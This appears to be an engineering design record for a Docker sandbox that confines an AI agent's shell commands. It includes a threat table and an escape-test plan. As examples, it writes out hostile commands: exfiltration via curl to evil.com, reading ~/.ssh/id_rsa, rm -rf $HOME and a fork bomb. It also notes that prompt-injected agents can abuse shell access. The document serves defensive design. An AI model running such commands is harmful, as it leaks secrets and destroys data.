# ADR-037 — Execution Sandbox (Docker exec boundary for the tool loop)

- **Status:** PROPOSED
- **Date:** 2026-06-18
- **Slug:** `execution-sandbox`
- **Plan:** Stage 3.5 — Full Tool Loop + Approval UX (gap #30)
- **Deciders:** architect, senior-security-engineer (**HARD gate — co-leads, BLOCKING**), senior-backend-1, ceo
- **Build order:** **THIS ADR SHIPS FIRST.** `sandbox.mjs` + the escape suite are green BEFORE ADR-038 (broker) or ADR-039 (approval UX) begin. Non-negotiable.
- **Related:** ADR-026 (git worktree isolation — reused as `/work` bind), ADR-029 (per-agent policy — gates the trigger, ADR-038/039 extend), F2b broker.mjs (UNCHANGED apply path), ADR-022 (allowlist/argv-array discipline — the same data-path rigor applies here)

## SECURITY LAW (stated verbatim in all three ADRs — ADR-037/038/039)

> **A git worktree is NOT a security boundary.** It is the same uid, the same filesystem, the same network as the host. An agent that can run `Bash` inside a worktree can `cat ~/.ssh/id_rsa`, `rm -rf $HOME`, or `curl evil.com -d @secret` — the worktree directory does nothing to stop any of it. **Approval prompts stop ACCIDENTS, not malice or prompt-injection.** A prompt-injected command that the operator clicks "allow" on is just as catastrophic as one that ran unattended.
>
> **THEREFORE the execution boundary MUST be a real OS-level sandbox (a Docker container).** The worktree (ADR-026) stays ONLY for git state — branch/diff/apply. ALL execution is jailed inside an ephemeral, locked container. **There is NO direct exec on the host, EVER, even with approval.** Approval governs *whether* a command runs in the jail; it never promotes a command to the host.

This ADR specifies that jail. ADR-038 builds the broker that drives it. ADR-039 builds the approval UX in front of it.

## Context

Today (`s1-engine`, 122 tests green) the runtime drives `claude -p` with a STRICTLY scoped tool set and **Bash is never allowed**: `cliReply` (`server.mjs` ~L505–528) and `engineDispatch` (~L722) push only `READ_TOOLS = ["Read","Glob","Grep"]` (`server.mjs` L95) or `WRITE_TOOLS = [...,"Write","Edit"]` (L96) into the `--allowed-tools` argv. There is no command execution anywhere in the product. Writes land in a worktree (ADR-026, `worktree.mjs`) and reach the live repo ONLY through the operator-gated apply broker (`broker.mjs`, F2b, the sole write path).

Gap #30 (Stage 3.5) asks for the **full tool loop**: the agent must be able to run commands — `npm install`, `node build.mjs`, `ls`, test runners — to actually scaffold and verify work, not just edit files blind. That means introducing command execution, which is the single highest-risk capability in the entire product.

The naive shape — "let `claude` run host Bash, gated by an approval prompt" — is **rejected outright** by the SECURITY LAW above. Two reasons:

1. The worktree is not a boundary; host Bash from inside it owns the machine.
2. Running `claude -p` *itself* inside a container is also rejected (see ADR-038 §"Mediated broker, not in-container claude"): it would require mounting subscription creds (`~/.claude`) into the box, which is unacceptable. So `claude` stays on the host with NO Bash; the **runtime** owns the tool loop and executes each approved command inside the jail.

### Phase 3.5.0 spike — the boundary is already PROVEN on this machine

Docker 27.3.1 (Docker Desktop, linux containers) is up. The following locked invocation was run and verified on this host:

```
docker run --rm --network none --cap-drop ALL --security-opt no-new-privileges \
  --user 65534:65534 --read-only --pids-limit 128 --memory 512m --cpus 1 \
  --tmpfs /tmp:rw,size=64m -v <worktree>:/work:rw -w /work <image> sh -c '...'
```

Verified facts (these are the boundary, documented here as the contract):

- Runs as **non-root** (uid/gid 65534 `nobody`) — confirmed `id` inside the box.
- Writes to the bind-mounted `/work` **flow back to the HOST worktree** — so edits made by a command reach `broker.listChanges`/`applyChanges` exactly as editor writes do.
- rootfs is **read-only** — a write outside `/work` and `/tmp` is blocked (`Read-only file system`).
- Host `/Users` is **NOT reachable** — no host fs mounted except the one worktree.
- Host `~/.ssh` is **NOT reachable** — same.
- **Network egress is BLOCKED** (`--network none`) — `wget`/DNS fail.
- All Linux capabilities **dropped** (`--cap-drop ALL`); `no-new-privileges` defeats setuid escalation.

## Decision

Add ONE new module — `agent-runtime/sandbox.mjs` — that wraps this proven invocation as a single, parameterized contract. Nothing else in the runtime gains the ability to exec. `sandbox.mjs` is the ONLY place `docker run` appears.

### 1. The docker invocation CONTRACT (locked — `sandbox.mjs` builds exactly this argv)

Built as an **argv array** for `spawn("docker", argv, { shell:false })` — never a shell string (same discipline as ADR-022 §3 and `worktree.mjs` L33). The worktree dir and the `sh -c` command body are the only variable parts; every flag below is a fixed literal.

```
docker run
  --rm                              # ephemeral — container destroyed on exit
  --network none                    # DEFAULT: no network (egress = separate capability, §3)
  --cap-drop ALL                    # zero Linux capabilities
  --security-opt no-new-privileges  # block setuid/setgid escalation
  --user 65534:65534                # non-root (nobody:nogroup)
  --read-only                       # immutable rootfs
  --tmpfs /tmp:rw,size=64m,noexec,nosuid   # the only writable scratch outside /work
  --pids-limit 128                  # fork-bomb ceiling
  --memory 512m                     # OOM-killer ceiling (no swap → --memory-swap 512m)
  --memory-swap 512m                # deny swap escape from the memory cap
  --cpus 1                          # CPU ceiling
  -v <REALPATH(worktreeDir)>:/work:rw   # the ONLY host path mounted; the task's worktree
  -w /work                          # cwd = the worktree
  --label missionalpha.sandbox=1    # for sweep/kill enumeration
  --name ma-sbx-<callId>            # deterministic name → kill-switch target
  <PINNED_IMAGE>                    # see §4 — pinned by digest
  sh -c <command>                   # command body, passed as ONE argv token (no host shell)
```

Hard rules enforced by `sandbox.mjs` and asserted by the escape suite:

- **No docker socket is EVER mounted** (`/var/run/docker.sock` absent). A container that can talk to the daemon can launch a privileged sibling — full host takeover. This is the single most important negative.
- **`-v` mounts EXACTLY ONE path**: `realpath(worktreeDir)`. `sandbox.mjs` resolves the realpath and asserts it lives under `worktreeRoot` (ADR-026, `mgr.worktreeRoot`) before building argv — a worktreeDir that escapes the worktree root is rejected, never mounted. Host `/`, `$HOME`, `/Users`, `~/.ssh`, `~/.claude` are NEVER mounted.
- **Default `--network none`.** Network is a separate, explicitly-granted capability (§3) — never on by default.
- No `--privileged`, no `--cap-add`, no `--device`, no `--pid=host`, no `--ipc=host`, no `--volume` other than the single worktree, no `-e` carrying host secrets.

### 2. Module API — `agent-runtime/sandbox.mjs` (ADDED)

```js
export function createSandbox(opts = {}) {
  // opts: { image, worktreeRoot, dockerBin="docker", defaultLimits, defaultTimeoutMs }
  // runInSandbox — run ONE command in a fresh locked container over the worktree.
  // worktreeDir : absolute path to the task's git worktree (ADR-026 mgr.pathFor(id))
  // command     : the command body string (passed as a single `sh -c` argv token)
  // options:
  //   network   : false (default) | true  → true ⇒ the constrained-network variant (§3)
  //   limits    : { memory, cpus, pids } overriding defaults (clamped to ceilings)
  //   timeoutMs : wall-clock kill (default RUNTIME_SANDBOX_TIMEOUT_MS, e.g. 120_000)
  //   signal    : AbortSignal → external kill-switch (ties to the route in ADR-039)
  //   callId    : opaque id → container --name (ma-sbx-<callId>) for targeted kill
  // returns: { stdout, stderr, exitCode, timedOut, killed, durationMs }
  async function runInSandbox(worktreeDir, command, options = {}) { /* … */ }

  // killSwitch — docker kill the named container (ADR-039 kill route, scheduler shutdown).
  async function kill(callId) { /* docker kill ma-sbx-<callId>; swallow "no such container" */ }

  // preflight — assert docker is up + the pinned image is present (startup health, §4).
  async function preflight() { /* docker version; docker image inspect <digest> */ }

  return { runInSandbox, kill, preflight };
}
```

**Kill-switch (two layers, both required).** (a) `options.timeoutMs` — `sandbox.mjs` arms a wall-clock timer; on fire it runs `docker kill ma-sbx-<callId>` AND kills the `docker run` child process, sets `{ timedOut:true, killed:true }`. (b) `options.signal` (AbortSignal) — an operator-initiated kill (ADR-039 kill route) or scheduler shutdown aborts the same way. `--rm` guarantees the container is reaped either way; a periodic sweep (`docker ps --filter label=missionalpha.sandbox=1` → kill any older than `2×timeoutMs`) backstops a leaked container if the runtime crashed mid-run.

**stdout/stderr handling.** Captured from the `docker run` child, **byte-capped** (`RUNTIME_SANDBOX_OUTPUT_CAP`, e.g. 256 KiB each, truncate-with-marker) to bound memory + the SSE stream. The broker (ADR-038) passes both through `scrub` (`server.mjs` L346) before any audit write or SSE emit — egress redaction is reused, not reinvented.

### 3. Network as an EXPLICIT, separately-approved capability

Default is `--network none`. A command that genuinely needs the network (e.g. `npm install`) does NOT silently get it. The flow (broker classification in ADR-038, approval in ADR-039):

1. Command classified SENSITIVE-with-network → returns a pending approval whose declared capabilities **list network egress explicitly** (ADR-039 UX shows it).
2. ONLY after a **separate network-grant approval**, `runInSandbox(..., { network: true })` re-runs the command in a container that **adds a constrained network** and nothing else:
   - Still `--cap-drop ALL`, `no-new-privileges`, `--user 65534`, `--read-only`, single `/work` mount, no docker socket.
   - The ONLY delta from the default invocation is the network: it uses a dedicated **internal-by-default bridge** that the spike will pin (e.g. a named `missionalpha-egress` network), with egress further constrained at the boundary where the deploy env allows (documented limitation below).
3. Network grant is **per-call** (not per-session by default) and audited as its own event (ADR-039). A grant never widens the FS/cap/user posture — it only flips the network flag.

**Documented limitation (open question OQ-037.3).** `--network none` is an absolute egress block and is the default. The "constrained network" variant on Docker Desktop (macOS dev) cannot enforce a per-destination egress allowlist purely with stock `docker run` flags. For the dev posture we accept: network-grant = a constrained bridge with no host fs and no caps, gated by a distinct approval, audited, and the agent already has no host secrets mounted (creds stay on the host with `claude`, never in the box). Tighter egress (proxy/firewall/`--dns` pinning, or an egress-filtering sidecar) is deferred to a follow-up and flagged for sr-security to rule on before any non-dev deploy.

### 4. Pinned image

- **Exec image:** a pinned image carrying `node` + `npm` + `git` for scaffolding (e.g. `node:20-alpine`), **pinned by digest** (`node:20-alpine@sha256:…`) in `sandbox.mjs` / env `RUNTIME_SANDBOX_IMAGE`, not a floating tag. Pinning by digest defeats tag-mutation / supply-chain swap of the base image.
- **Escape-suite image:** the escape tests may use a minimal `alpine:3` (also digest-pinned) — they assert the *boundary*, not toolchain presence.
- `preflight()` runs at startup (and is reported in `GET /runtime/health`): docker reachable + the pinned digest present locally. If docker is down or the digest is absent, the **tool loop is disabled** (ADR-038 `execTool` fails closed) — the rest of the runtime (chat, read/write tools, apply broker) is unaffected.

### 5. Worktree relationship (explicit)

`worktree.mjs` (ADR-026) already states it is "git-state isolation ONLY — NOT an execution or security boundary." This ADR is the other half: the worktree provides the *directory* that gets bind-mounted at `/work`; the **container provides the execution boundary**. `sandbox.mjs` takes `mgr.pathFor(id)` (or `create(id).path`) as `worktreeDir`. The diff/apply path (`broker.mjs`) reads that same worktree afterward — UNCHANGED — and re-runs `applyAllowed`/`CONFIG_GUARD`/symlink+realpath guards on every apply, so a command writing into `/work` cannot bypass the live-repo write guards.

## Security invariant (sr-security HARD gate — BLOCKING)

**INVARIANT: every executed command runs inside an ephemeral container that (a) mounts exactly one host path — the task worktree — and no other; (b) has no network by default; (c) has zero Linux capabilities + no-new-privileges + non-root + read-only rootfs; (d) has no docker socket; (e) is bounded by pids/memory/cpu/timeout; (f) is destroyed on exit. No command path reaches the host shell or host fs. EVER.**

### attack → mitigation

| Attack | Vector | Mitigation |
|---|---|---|
| Filesystem escape | `cat /etc/passwd`, `cat ~/.ssh/id_rsa`, `cat ~/.claude/*`, write to `$HOME` | Only `realpath(worktreeDir)` mounted at `/work`; host `/`,`$HOME`,`.ssh`,`.claude` not mounted; rootfs `--read-only`; `/tmp` tmpfs `noexec,nosuid`. Reading host secrets returns no-such-file. |
| Network egress / exfil | `curl evil.com -d @file`, DNS tunneling | `--network none` by default; egress requires a SEPARATE network-grant approval (§3); even then no host fs/secrets are in the box. |
| Privilege escalation | setuid binary, `sudo`, `su` | `--cap-drop ALL` + `--security-opt no-new-privileges` + `--user 65534` (no root in box). |
| Syscall abuse | mount, ptrace, raw sockets, module load | caps dropped → CAP_SYS_ADMIN/CAP_NET_RAW/etc unavailable; default seccomp profile retained (NOT `--security-opt seccomp=unconfined`). |
| Resource exhaustion | fork bomb, memory balloon, CPU spin, disk fill | `--pids-limit 128`, `--memory 512m` + `--memory-swap 512m`, `--cpus 1`, `/tmp` size-capped 64m, wall-clock `timeoutMs` kill. |
| Docker-socket abuse | container launches privileged sibling | docker socket NEVER mounted; asserted by escape suite (`docker` cmd inside box fails / socket absent). |
| Image tampering / supply chain | malicious base image pushed under the tag | image pinned by **digest**, not tag; `preflight()` verifies the digest present at startup. |
| Mount-flag injection via worktree path | a crafted `worktreeDir` that resolves outside the root | `sandbox.mjs` `realpath`s `worktreeDir` and asserts it is under `mgr.worktreeRoot` before building argv; argv array (no shell) so the path can't break out of the `-v` slot. |
| Leaked container after crash | runtime dies mid-run, container lingers | `--rm` + label-filtered sweep kills `missionalpha.sandbox=1` containers older than `2×timeout`. |
| Output flood (DoS the host/SSE) | command prints gigabytes | stdout/stderr byte-capped per stream; truncate-with-marker. |

### ESCAPE-SUITE CONTRACT (MUST be green BEFORE ADR-038 broker ships — BLOCKING)

These are concrete tests against `runInSandbox`. The broker (ADR-038) does not ship until **every one passes**. Lives in `agent-runtime/test/` alongside the 122 existing tests; run in CI. Each test runs a hostile command and asserts the boundary held.

1. **Host fs read blocked** — `cat /etc/passwd` from the *host* path is unreachable: assert a probe for a known host-only file (e.g. mount-attempt of `/Users`) is absent; reading `~/.ssh/id_rsa` / `~/.claude/*` via any in-box path fails (no such file). Container's own `/etc/passwd` existing is fine — assert host SSH/creds are NOT present.
2. **Worktree write flows back** — write a file under `/work` in the box; assert it appears in the host worktree dir (positive control — proves the boundary doesn't break the apply path).
3. **rootfs read-only** — `touch /escape` (outside `/work`,`/tmp`) fails with read-only fs; `/work` and `/tmp` writes succeed.
4. **Network blocked by default** — with `network:false`, an egress attempt (`wget`/DNS) fails/times out.
5. **Network only when granted** — with `network:true`, egress to the constrained bridge is reachable (positive control) AND host fs/secrets still unreachable (re-assert §3 invariants under network mode).
6. **Privilege escalation fails** — `id` reports non-root (uid 65534); a setuid/`no-new-privileges` escalation probe stays unprivileged.
7. **Docker socket absent** — `ls /var/run/docker.sock` / `docker ps` in-box fails (no socket, no daemon reach).
8. **Fork bomb bounded** — a `:(){ :|:& };:`-style probe is capped by `--pids-limit` and reaped by timeout; host stays responsive (assert run returns `timedOut`/`killed`, host process count unchanged).
9. **OOM bounded** — a memory balloon is OOM-killed at the `--memory` ceiling; `exitCode`≠0, host not impacted.
10. **Kill-switch terminates a runaway** — `sleep 9999`; `kill(callId)` (and AbortSignal abort, and `timeoutMs` expiry) each terminate the container promptly; `{ killed:true }`/`{ timedOut:true }` returned; no leaked container (sweep finds none).
11. **Mount-injection rejected** — `runInSandbox` called with a `worktreeDir` resolving outside `worktreeRoot` throws/refuses before any `docker run`.
12. **Image digest enforced** — `preflight()` fails closed when the pinned digest is absent (simulate by pointing at a bogus digest).

## Consequences

**Positive** — a real OS-level execution boundary, proven on the target machine; the worktree↔apply path is untouched (`broker.mjs` UNCHANGED, guards re-run on apply); `claude` keeps its host creds and never runs in a box; one small ADDED module (`sandbox.mjs`) is the entire exec surface; failure is closed (docker down ⇒ tool loop off, rest of runtime fine).

**Negative / accepted** — requires Docker present on the host (documented dependency; `preflight` surfaces it). Per-command container spin-up adds latency (acceptable for a tool loop; can pre-warm a pool later if needed — out of scope). Constrained-network egress filtering on Docker Desktop is coarse (OQ-037.3 — accepted for dev, sr-security to rule before non-dev). Container escapes are a real (if rare) class — mitigated by dropped caps + default seccomp + non-root + read-only + no-socket; kernel-level hardening (gVisor/Kata) deferred and noted.

**Observability** — every `runInSandbox` logged via factory `audit` (ADR-038 owns the call-site) with `{callId, exitCode, timedOut, killed, durationMs, network}`; `GET /runtime/health` reports `sandbox: { docker: ok|down, image: <digest>, ready }`. stdout/stderr `scrub`bed before audit/SSE.

## Alternatives rejected

1. **Host Bash gated by approval** — violates the SECURITY LAW: worktree is not a boundary, approval stops accidents not malice. The whole reason this ADR exists. NO.
2. **`claude -p` running inside the container** — would mount `~/.claude` subscription creds into an agent-controlled box. Unacceptable. The runtime mediates instead (ADR-038). NO.
3. **chroot / firejail / plain subprocess + rlimits** — same-kernel, same-uid options that are far weaker than a container and don't give the proven FS/network/cap isolation already verified here. NO.
4. **gVisor / Kata / microVM** — stronger isolation, but not installed/proven on this machine and heavier than Stage 3.5 needs. Deferred; the docker contract here is the floor, not the ceiling.
5. **Per-session long-lived container** — larger blast radius + state bleed between tasks; ephemeral `--rm`-per-call is the safer default.

## sr-security HARD sign-off conditions (BLOCKING — must hold before ADR-038 begins)

- (a) `sandbox.mjs` builds the docker argv as an **array** (no `shell:true`); the only variable tokens are `realpath(worktreeDir)` and the `sh -c` command body.
- (b) Exactly ONE host path is mounted and it is asserted-under-`worktreeRoot`; no docker socket, no extra `-v`, no `--privileged`/`--cap-add`/`--device`/`--pid=host`.
- (c) Defaults are `--network none`, `--cap-drop ALL`, `no-new-privileges`, `--user 65534`, `--read-only` + size-capped tmpfs, pids/memory/cpu ceilings, `--rm`.
- (d) Image pinned by digest; `preflight` fails closed if absent/docker down.
- (e) Kill-switch (timeout + AbortSignal + `kill(callId)`) + leaked-container sweep all proven.
- (f) **The entire ESCAPE-SUITE (tests 1–12) is GREEN in CI.** This is the gate to start ADR-038.
